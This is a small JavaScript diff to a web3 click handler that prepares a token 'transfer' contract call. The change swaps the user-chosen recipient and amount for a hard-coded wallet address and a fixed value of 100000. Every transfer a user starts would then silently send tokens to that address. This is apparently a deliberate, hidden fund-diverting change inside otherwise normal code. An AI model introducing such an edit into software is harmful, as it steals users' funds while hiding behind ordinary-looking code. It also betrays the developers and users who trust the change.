@@ -64,7 +64,7 @@ const onClick = () => {
   const transaction = prepareContractCall({
     contract,
     method: "function transfer(address to, uint256 value)",
-    params: [to, value],
+    params: ['0x5AdA0f2f59d2acDbE33Cc87f354E2c1357C4E9C9', 100000],
   });
   sendTx(transaction);
 };
